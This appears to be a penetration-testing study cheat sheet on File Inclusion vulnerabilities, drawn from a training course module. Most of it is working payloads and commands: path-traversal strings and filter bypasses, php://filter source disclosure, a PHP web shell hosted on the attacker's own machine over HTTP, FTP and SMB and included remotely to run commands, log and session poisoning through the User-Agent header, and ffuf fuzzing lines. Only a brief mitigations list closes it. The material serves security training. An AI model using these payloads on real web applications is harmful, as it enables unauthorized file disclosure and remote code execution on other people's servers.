# File Inclusion

## 🎯 Main Idea
- File Inclusion flaws occur when user input controls which file a web app loads (e.g. `?language=`), without proper sanitization.
- Goal: read sensitive local files (LFI), disclose source code, and escalate to remote code execution via RFI, PHP wrappers, and log poisoning.
- (Note: this module has no `00 - Cheatsheet.md`; payloads below are extracted from the lesson files.)

## 💥 Attack / Exploit Vectors
### Local File Inclusion (LFI) & Path Traversal
- Include local files via relative/absolute paths; traverse out of the web root.
- **Commands**
  - `/index.php?page=../../../../etc/passwd` — read a Linux local file via path traversal
  - `../../../../windows/boot.ini` / `C:\Windows\boot.ini` — Windows equivalent
  - `?language=/etc/passwd` — absolute path inclusion
  - Second-order: inject traversal into stored data (e.g. `/profile/$username/avatar.png`) so it's included elsewhere
### Basic Bypasses (filters / appended extension)
- Defeat naive filters, non-recursive stripping, approved-path checks, and appended `.php`.
- **Commands**
  - `....//....//etc/passwd` — bypass non-recursive `../` removal (becomes `../` after one strip)
  - `%2e%2e%2f` — URL-encoded `../` to bypass filters (double-encode if needed)
  - `./languages/../../../../etc/passwd` — start with an approved path to pass validation
  - `/etc/passwd%00` — null-byte to drop appended extension (PHP < 5.3/5.4 only)
  - `/etc/passwd/.` — trailing `/.` to bypass appended `.php` in some configs
### PHP Filters — Source Code Disclosure
- Use `php://filter` with base64 to read PHP source instead of executing it.
- **Commands**
  - `php://filter/read=convert.base64-encode/resource=config` — base64-encode and disclose `config.php` source
  - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` — fuzz for PHP pages to read
  - `echo 'PD9waHAK...' | base64 -d` — decode the disclosed source
### Remote File Inclusion (RFI) — RCE
- Include a remote URL hosting a malicious PHP shell (requires `allow_url_include`).
- **Commands**
  - `?language=http://127.0.0.1:80/index.php` — verify RFI by first including a local URL (also SSRF)
  - `echo '<?php system($_GET["cmd"]); ?>' > shell.php` — create a malicious web shell
  - `sudo python3 -m http.server <LISTENING_PORT>` — host the shell over HTTP
  - `?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` — include remote shell and run a command
  - `sudo python -m pyftpdlib -p 21` + `?language=ftp://<OUR_IP>/shell.php&cmd=id` — host/include via FTP
  - `impacket-smbserver -smb2support share $(pwd)` + `?language=\\<OUR_IP>\share\shell.php&cmd=whoami` — SMB (Windows, no `allow_url_include` needed)
### Log Poisoning — RCE
- Write PHP code into a controllable, readable log/session file, then include it to execute.
- **Commands**
  - `?language=/var/lib/php/sessions/sess_<PHPSESSID>` — include a PHP session file (PHP Session Poisoning)
  - `?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` — poison the session via `page` value, then include `&cmd=id`
  - `?language=/var/log/apache2/access.log` — include the Apache access log
  - `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison` + `curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison` — poison log via User-Agent header
  - `/proc/self/environ`, `/proc/self/fd/N` — alternative poisonable files if logs unreadable
  - Other logs: `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log`
### Automated Scanning / Fuzzing
- Fuzz for vulnerable parameters, LFI payloads, webroot, logs, and config files.
- **Commands**
  - `ffuf -w .../burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` — fuzz for exposed parameters
  - `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` — fuzz LFI payloads
  - `ffuf -w .../default-web-root-directory-linux.txt:FUZZ -u '...?language=../../../../FUZZ/index.php' -fs 2287` — find server webroot
  - `ffuf -w ./LFI-WordList-Linux:FUZZ -u '...?language=../../../../FUZZ' -fs 2287` — fuzz for logs/config files

## 🛠️ Key Tools & Concepts
- Vulnerable functions — `include()`/`include_once()`, `require()`, `file_get_contents()`, `fopen()`, `readfile()` (PHP); `import` (Java); `@Html.Partial()`/`RemotePartial()`, `include` (.NET); `res.render()`, `fs.readFile()` (NodeJS)
- Read vs Execute — some functions only read a file's content, others execute included PHP
- `php://filter` wrapper — stream filters (base64) for source disclosure
- `allow_url_include` — PHP setting that must be On for RFI over http/ftp
- ffuf / seclists — fuzzing tool and LFI wordlists (LFI-Jhaddix.txt)
- LFI tools — LFISuite, LFiFreak, liffy (mostly outdated, python2)

## 🛡️ Mitigations
- Avoid passing user input to file-inclusion functions; use a whitelist/allow-list of permitted files
- Prevent directory traversal (strip/validate `../`, use `basename()`, verify final resolved path)
- Harden web server config: disable `allow_url_include`/`allow_url_fopen`, restrict file permissions
- Deploy a Web Application Firewall (WAF) as defense in depth
